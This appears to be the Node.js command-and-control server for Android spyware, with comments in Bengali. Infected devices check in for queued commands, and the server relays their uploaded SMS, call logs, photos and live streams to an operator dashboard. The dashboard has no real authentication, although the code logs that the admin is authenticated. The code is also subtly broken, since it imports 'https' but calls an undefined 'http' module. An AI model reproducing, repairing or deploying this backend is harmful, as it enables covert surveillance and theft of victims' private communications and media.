const express = require('express');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // 100MB support
});

const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '100mb' }));

let devices = {}; 

// --- APK Connectivity API ---

// ১. হার্টবিট এবং কমান্ড আদান-প্রদান
app.post('/api/ping', (req, res) => {
    const { deviceId, status } = req.body;
    if (deviceId) {
        if (!devices[deviceId]) devices[deviceId] = { commands: [], lastSeen: '' };
        devices[deviceId].info = status; 
        devices[deviceId].lastSeen = new Date().toLocaleTimeString();
        
        // প্যানেলে ডিভাইস আপডেট পাঠানো
        io.emit('update_list', { deviceId, info: status });
        
        // অ্যাপের জন্য কমান্ড পাঠানো
        const cmdToSend = devices[deviceId].commands.splice(0);
        res.json({ commands: cmdToSend });
    } else res.status(400).send();
});

// ২. ডাটা এবং ফাইল আপলোড (SMS, Call Logs, Photos, etc.)
app.post('/api/upload', (req, res) => {
    const { deviceId, type, data, fileName } = req.body;
    // সরাসরি প্যানেলে পাঠানো
    io.emit('new_incoming_data', { deviceId, type, data, fileName });
    console.log(`[ALERTER] ${type} received from ${deviceId}`);
    res.json({ status: 'success' });
});

// ৩. লাইভ স্ট্রিমিং রুট (ইভেন্ট নাম ফিক্স করা হয়েছে)
app.post('/api/stream', (req, res) => {
    const { deviceId, streamType, buffer } = req.body;
    // প্যানেলের 'new_incoming_data' ইভেন্টের সাথে মিল রাখা হয়েছে
    io.emit('new_incoming_data', { deviceId, type: streamType, data: buffer });
    res.status(200).send();
});

// --- Dashboard Control Logic ---
io.on('connection', (socket) => {
    console.log('Admin Authenticated');

    socket.on('send_cmd', ({ id, cmd, payload }) => {
        if (devices[id]) {
            // কমান্ড কিউতে রাখা যা পরবর্তী Ping-এ অ্যাপ পাবে
            devices[id].commands.push({ action: cmd, ...payload });
            console.log(`[CONTROL] ${cmd} assigned to ${id}`);
        }
    });
});

server.listen(PORT, () => console.log(`SYSTEM MASTER SERVER ACTIVE: PORT ${PORT}`));
